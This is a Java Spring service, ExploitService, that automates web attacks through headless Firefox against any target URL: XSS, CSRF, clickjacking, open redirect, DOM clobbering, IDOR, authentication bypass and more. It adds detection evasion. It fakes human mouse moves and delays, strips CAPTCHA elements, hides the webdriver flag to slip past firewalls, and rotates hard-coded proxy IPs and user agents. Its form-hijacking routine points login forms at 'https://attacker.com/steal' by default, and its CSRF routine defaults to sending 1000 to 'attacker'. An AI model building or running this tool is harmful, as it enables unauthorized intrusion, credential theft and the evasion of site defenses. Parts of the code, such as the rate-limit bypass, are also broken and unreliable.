package com.web.webservices;

import org.apache.commons.io.FileUtils;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.interactions.Actions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.springframework.beans.factory.annotation.*;
import org.springframework.stereotype.*;
import org.springframework.web.client.*;
import java.io.*;
import java.net.*;
import java.time.Duration;
import java.util.*;
import org.openqa.selenium.*;
import org.openqa.selenium.NoSuchElementException;
import org.openqa.selenium.firefox.*;
import com.web.webDTO.ExploitRequestDTO;
import com.web.webDTO.ExploitResponseDTO;
import io.github.bonigarcia.wdm.*;
@Service
public class ExploitService {
	@Autowired
	private RestTemplate restTemplate;

	public ExploitResponseDTO executeExploit(ExploitRequestDTO request) {
		// Verify Firefox installation
		if (!new File("/usr/bin/firefox").exists()) {
			return createErrorResponse("Firefox binary not found at /usr/bin/firefox");
		}

		WebDriverManager.firefoxdriver().setup();
		FirefoxOptions options = configureFirefoxOptions(request);
		System.setProperty("webdriver.gecko.driver", "/usr/bin/geckodriver");

		WebDriver driver = null;
		ExploitResponseDTO response = new ExploitResponseDTO();

		try {
			driver = new FirefoxDriver(options);
			humanizeBrowserSession(driver);

			// Apply security bypasses
			applyBypassMethods(driver, request);

			// Execute selected exploit with timing
			String result = executeExploitWithTiming(driver, request);
			response.setResult(result);
			response.setSuccess(true);

			// Capture screenshot if enabled
			if (request.isCaptureScreenshot()) {
				response.setScreenshotBase64(captureScreenshot(driver));
			}

		} catch (SessionNotCreatedException e) {
			response.setResult("Browser session failed: " + e.getMessage());
		} catch (Exception e) {
			response.setResult("Error: " + e.getMessage());
		} finally {
			if (driver != null) {
				driver.quit();
			}
		}
		return response;
	}

	
	// create error respond
	private ExploitResponseDTO createErrorResponse(String message) {
		ExploitResponseDTO response = new ExploitResponseDTO();
		response.setResult(message);
		response.setSuccess(false);
		return response;
	}

	
	// firefox configuration
	private FirefoxOptions configureFirefoxOptions(ExploitRequestDTO request) {
		FirefoxOptions options = new FirefoxOptions();
		options.setBinary("/usr/bin/firefox");
		options.addArguments("--disable-web-security");
		options.addArguments("--ignore-certificate-errors");
		//options.addArguments("--disable-blink-features=AutomationControlled");
		//options.setCapability("useAutomationExtension", false);

		if (!request.isDebugMode()) {
			options.addArguments("--headless");
			options.addArguments("--window-size=1920,1080");
		} else {
			options.addArguments("--window-position=2000,0"); // Move to secondary monitor if available
		}
		return options;
	}

	
	private void humanizeBrowserSession(WebDriver driver) {
	    try {
	        // Small delay like a human pause
	        Thread.sleep(1000 + new Random().nextInt(2000));

	        // Move relative to a known visible element (like <body>)
	        WebElement body = driver.findElement(By.tagName("body"));
	        Actions actions = new Actions(driver);

	        // Safe offset within visible area
	        int xOffset = new Random().nextInt(20) - 10; // -10 to +9
	        int yOffset = new Random().nextInt(20) - 10;

	        actions.moveToElement(body, 10, 10) // Start from known position
	               .moveByOffset(xOffset, yOffset)
	               .perform();
	    } catch (InterruptedException ignored) {
	    } catch (NoSuchElementException e) {
	        System.err.println("Body element not found for mouse move.");
	    }
	}



	private String executeExploitWithTiming(WebDriver driver, ExploitRequestDTO request) throws Exception {
		long startTime = System.currentTimeMillis();
		String result = switch (request.getExploitType()) {
		case "XSS" -> testXSS(driver, request);
		case "CSRF" -> testCSRF(driver, request);
		case "Clickjacking" -> testClickjacking(driver, request);
		case "OpenRedirect" -> testOpenRedirect(driver, request);
		case "FormHijacking" -> testFormHijacking(driver, request);
		case "UIRedressing" -> testUIRedressing(driver, request);
		case "DOMClobbering" -> testDOMClobbering(driver, request);
		case "FileUpload" -> testFileUpload(driver, request);
		case "AuthenticationBypass" -> testAuthBypass(driver, request);
		case "IDOR" -> testIDOR(driver, request);
		default -> "Unsupported exploit type";
		};
		long duration = System.currentTimeMillis() - startTime;
		return result + " (Execution time: " + duration + "ms)";
	}

	
	
	
	
	// ===== EXPLOIT METHODS =====

	   // testing for xss
    private String testXSS(WebDriver driver, ExploitRequestDTO request) {
        String payload = request.getInputs().get("payload");
        String injectionPoint = request.getInputs().getOrDefault("injectionPoint", "URL");
        
        try {
            if ("URL".equals(injectionPoint)) {
                navigateWithHumanDelay(driver, request.getTargetUrl() + "?q=" + URLEncoder.encode(payload));
            } else {
                navigateWithHumanDelay(driver, request.getTargetUrl());
                ((JavascriptExecutor) driver).executeScript(
                    "document.getElementById('" + injectionPoint + "').innerHTML = '" + payload + "';"
                );
            }

            // Check both alert and console approaches
            try {
                WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(2));
                Alert alert = wait.until(ExpectedConditions.alertIsPresent());
                String text = alert.getText();
                alert.accept();
                return "XSS Success! Alert text: " + text;
            } catch (Exception e) {
                // Fallback to console detection
                Object consoleOutput = ((JavascriptExecutor)driver).executeScript(
                    "return window.xssDetected || 'No console verification'");
                if (!consoleOutput.toString().contains("No console")) {
                    return "XSS Success (Console): " + consoleOutput;
                }
                return "XSS executed but no verification detected";
            }
        } catch (Exception e) {
            return "XSS Failed: " + e.getMessage();
        }
    }

    // xss method 
    private void navigateWithHumanDelay(WebDriver driver, String url) {
        try {
            driver.get(url);
            Thread.sleep(500 + new Random().nextInt(1500)); // Human-like delay
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    
    

	private String testCSRF(WebDriver driver, ExploitRequestDTO request) {
		String formAction = request.getInputs().getOrDefault("action", request.getTargetUrl());
		String formFields = request.getInputs().getOrDefault("fields",
				"<input name='amount' value='1000'><input name='to' value='attacker'>");

		((JavascriptExecutor) driver).executeScript(
				"var form = document.createElement('form');" + "form.method='POST'; form.action='" + formAction + "';"
						+ "form.innerHTML='" + formFields + "';" + "document.body.appendChild(form); form.submit();");
		return "CSRF form submitted to " + formAction;
	}

	private String testClickjacking(WebDriver driver, ExploitRequestDTO request) {
		String targetUrl = request.getTargetUrl();
		String clickElement = request.getInputs().getOrDefault("element", "#submit-btn");

		((JavascriptExecutor) driver).executeScript("var iframe = document.createElement('iframe');" + "iframe.src = '"
				+ targetUrl + "';" + "iframe.style.position='absolute';" + "iframe.style.width='100%';"
				+ "iframe.style.height='100%';" + "iframe.style.opacity='0.5';" + "iframe.style.zIndex='9999';"
				+ "document.body.appendChild(iframe);" + "setTimeout(function() {"
				+ "   iframe.contentDocument.querySelector('" + clickElement + "').click();" + "}, 3000);");
		return "Clickjacking frame created for " + targetUrl;
	}

	private String testOpenRedirect(WebDriver driver, ExploitRequestDTO request) {
		String redirectUrl = request.getInputs().get("redirectUrl");
		String vulnerableParam = request.getInputs().getOrDefault("param", "redirect");

		driver.get(request.getTargetUrl() + "?" + vulnerableParam + "=" + URLEncoder.encode(redirectUrl));

		try {
			Thread.sleep(2000); // Wait for redirect
			if (driver.getCurrentUrl().contains(redirectUrl)) {
				return "Open redirect successful to " + redirectUrl;
			}
			return "Redirect failed - URL is " + driver.getCurrentUrl();
		} catch (Exception e) {
			return "Redirect test error: " + e.getMessage();
		}
	}

	private String testFormHijacking(WebDriver driver, ExploitRequestDTO request) {
		String formId = request.getInputs().getOrDefault("formId", "login-form");
		String actionUrl = request.getInputs().getOrDefault("action", "https://attacker.com/steal");

		((JavascriptExecutor) driver).executeScript("var form = document.getElementById('" + formId + "');"
				+ "form.action = '" + actionUrl + "';" + "form.method = 'GET';");
		return "Form " + formId + " hijacked to submit to " + actionUrl;
	}

	private String testUIRedressing(WebDriver driver, ExploitRequestDTO request) {
		String targetElement = request.getInputs().get("element");
		String fakeContent = request.getInputs().get("content");

		((JavascriptExecutor) driver).executeScript(
				"var element = document.querySelector('" + targetElement + "');" + "element.innerHTML = '" + fakeContent
						+ "';" + "element.style.color = 'transparent';" + "element.style.fontSize = '0px';");
		return "UI redressing applied to " + targetElement;
	}

	private String testDOMClobbering(WebDriver driver, ExploitRequestDTO request) {
		String clobberVar = request.getInputs().get("variable");
		String clobberValue = request.getInputs().get("value");

		((JavascriptExecutor) driver).executeScript("document.write('<a id=\"" + clobberVar + "\" name=\"" + clobberVar
				+ "\" href=\"" + clobberValue + "\"></a>');");
		return "DOM clobbering attempted for variable " + clobberVar;
	}

	private String testFileUpload(WebDriver driver, ExploitRequestDTO request) {
		String filePath = request.getInputs().get("filePath");
		String fileInputId = request.getInputs().getOrDefault("inputId", "file-upload");

		driver.get(request.getTargetUrl());
		WebElement fileInput = driver.findElement(By.id(fileInputId));
		fileInput.sendKeys(filePath);
		driver.findElement(By.id("submit-btn")).click();

		return "File " + filePath + " uploaded via " + fileInputId;
	}

	private String testAuthBypass(WebDriver driver, ExploitRequestDTO request) {
		String username = request.getInputs().get("username");
		String password = request.getInputs().get("password");

		driver.get(request.getTargetUrl());
		driver.findElement(By.id("username")).sendKeys(username);
		driver.findElement(By.id("password")).sendKeys(password);
		driver.findElement(By.id("submit")).click();

		if (driver.getCurrentUrl().contains("dashboard")) {
			return "Authentication bypass successful!";
		}
		return "Authentication bypass failed";
	}

	private String testIDOR(WebDriver driver, ExploitRequestDTO request) {
		String paramName = request.getInputs().get("param");
		String paramValue = request.getInputs().get("value");

		driver.get(request.getTargetUrl() + "?" + paramName + "=" + paramValue);

		if (driver.getPageSource().contains("Unauthorized")) {
			return "IDOR attempt failed - Access denied";
		}
		return "IDOR attempt successful for parameter " + paramName;
	}

	// ===== BYPASS METHODS =====

	private void applyBypassMethods(WebDriver driver, ExploitRequestDTO request) {
		if (request.isBypassCaptcha()) {
			((JavascriptExecutor) driver)
					.executeScript("document.querySelectorAll('.g-recaptcha, .captcha').forEach(e => e.remove());");
		}

		if (request.isBypassRateLimit()) {
			FirefoxOptions options = new FirefoxOptions();
			options.addArguments("--proxy-server=" + getRandomProxy());
			options.addArguments("--user-agent=" + getRandomUserAgent());
		}

		if (request.isBypassWAF()) {
			((JavascriptExecutor) driver)
					.executeScript("Object.defineProperty(navigator, 'webdriver', {get: () => false});"
							+ "window.chrome = undefined;");
		}
	}

	// ===== UTILITY METHODS =====

	private String captureScreenshot(WebDriver driver) throws IOException {
		File screenshot = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
		byte[] fileContent = FileUtils.readFileToByteArray(screenshot);
		return Base64.getEncoder().encodeToString(fileContent);
	}

	private String getRandomProxy() {
		String[] proxies = { "106.105.173.187:47218", "89.31.143.12:80", "103.59.190.209:56252" };
		return proxies[new Random().nextInt(proxies.length)];
	}

	private String getRandomUserAgent() {
		String[] userAgents = { "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
				"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)" };
		return userAgents[new Random().nextInt(userAgents.length)];
	}
}